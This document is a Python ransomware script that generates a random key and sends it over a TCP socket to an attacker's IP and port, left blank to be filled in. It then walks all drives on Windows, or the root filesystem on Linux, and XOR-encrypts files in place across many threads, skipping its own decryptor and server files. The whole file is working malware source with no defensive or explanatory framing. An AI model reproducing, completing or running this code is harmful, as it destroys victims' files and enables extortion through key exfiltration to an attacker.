#!/usr/bin/env python3

from pathlib import Path
import time
import os
import socket
import threading



def encrypt_win32(key,file):

    try:
        with open(file,"rb") as target_file:
            
            print(f"[+] encrypting {file}")
            result=bytearray()
            data=target_file.read()
            for i in range(len(data)):
                result.append(data[i] ^ key[i % len(key)])
        
        with open(file,"wb") as target_file:
            target_file.write(bytes(result))
            print(f"[+] {file} encrypted successfully")
            
    except Exception as e:
        print(f"[x] failed to encrypt {file}... error: {e}")

def encrypt_posix(key,file):

    try:
        with open(file,"rb") as target_file:
            
            print(f"[+] encrypting {file}")
            result=bytearray()
            data=target_file.read()
            for i in range(len(data)):
                result.append(data[i] ^ key[i % len(key)])
        
        with open(file,"wb") as target_file:
            target_file.write(bytes(result))
            print(f"[+] {file} encrypted successfully")
            
    except Exception as e:
        print(f"[x] failed to encrypt {file}... error: {e}")   


def gen_key():
    #generate 512-bit key (64 bytes)
    print("[+] loading source of entropy\n\n\n")
    key=os.urandom(64)
    '''
    with open("key.key","wb") as enc_key:
        enc_key.write(key)
    '''
    return key

def send_key(key):
    IP_ADDR="" #ADD IP HERE
    PORT=      #ADD PORT HERE
    hex_key=key.hex()
    #print(hex_key)
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        while True:
            try:
                print(f"[+] connecting to {IP_ADDR}:{PORT}...")
                s.connect((IP_ADDR,PORT))
                print(f"[+] connection succeeded...")
                print(f"[+] sending key...")
                s.send(hex_key.encode())
                print(f"[+] key sent..")
                break
            except Exception as e:
                print(f"[x] connection failed, error : {e}")
                time.sleep(3)
                print(f"[+] retrying to connect")
            finally:
                s.close()




def check_os():
    if os.name == "nt":
        return 0
    elif os.name == "posix":
        return 1
    else:
        return 2

if __name__ == "__main__":
        
    if check_os() == 0:
        #windows
        os.system("cls")
        key=gen_key()
        send_key(key)
        file_paths=[]
        threads=[]
        possible_root_path = [
            "A:/", "B:/", "C:/", "D:/", "E:/", "F:/", "G:/", "H:/", 
            "I:/", "J:/", "K:/", "L:/", "M:/", "N:/", "O:/", "P:/", 
            "Q:/", "R:/", "S:/", "T:/", "U:/", "V:/", "W:/", "X:/", 
            "Y:/", "Z:/"
        ] 
        actual_root_path=[]
        required_paths=[]
        excluded_paths=[
        "C:/Windows", "C:/Program Files", 
        "C:/Program Files (x86)"
        ]
        excluded_files_processed=0
        
        for i in range(len(possible_root_path)):
            if os.path.exists(possible_root_path[i]):
                actual_root_path.append(possible_root_path[i])
        files_processed=0
        counter=0
        

        
        for path in range(len(actual_root_path)):
            for dirpath,dirnames,filenames in os.walk(actual_root_path[path],topdown=True):
                for filename in filenames:
                    if filename == "encryptor.py" or filename == "decryptor.py" or filename == "server.py" or filename == "enc_key.key":
                        continue
                    file_paths.append(Path(dirpath) / filename)
                    files_processed+=1
                    print(f"\r[+] added {files_processed} files...",end='')
        for path in file_paths:
            for excluded in excluded_paths:
                if path.is_relative_to(Path(excluded)):
                    break
                required_paths.append(path)
                excluded_files_processed+=1
                print(f"\r[+] added {excluded_files_processed} important files...",end='')
                
            
               
                thread=threading.Thread(target=encrypt_win32,args=(key,required_paths[counter]),daemon=True)
                counter+=1
                threads.append(thread)
                thread.start()
                
                
        for thread in threads:
            thread.join()
        
        '''
        #debug
        for path in required_paths:
            print(path)
        '''
        
        
    elif check_os() == 1:
        #linux
        os.system("clear")
        key=gen_key()
        send_key(key)
        file_paths=[]
        threads=[]
        actual_root_path=["/"]
        required_paths=[]
        excluded_paths=[
        "/bin","/sbin","/lib",
        "/lib64","/sys","/opt",
        "/var","/etc","/proc",
        "/usr","/run","/mnt",
        "/media"
        ]
        excluded_files_processed=0
        files_processed=0
        counter=0
        
        for path in range(len(actual_root_path)):
            for dirpath,dirnames,filenames in os.walk(actual_root_path[path],topdown=True):
                for filename in filenames:
                    if filename == "encryptor.py" or filename == "decryptor.py" or filename == "server.py" or filename == "key.key":
                        continue
                    file_paths.append(Path(dirpath) / filename)
                    files_processed+=1
                    print(f"\r[+] added {files_processed} files...",end='')
        
        for path in file_paths:
            for excluded in excluded_paths:
                if path.is_relative_to(excluded):
                    continue
                required_paths.append(path)
                excluded_files_processed+=1
                print(f"\r[+] added {excluded_files_processed} important files...",end='')
                
                
                thread=threading.Thread(target=encrypt_posix,args=(key,required_paths[counter]),daemon=True)
                counter+=1
                threads.append(thread)
                thread.start()
                    
     
        for thread in threads:
            thread.join()        
        
       
        
    else:
        print("[x] the os is not supported..")
        exit(1)

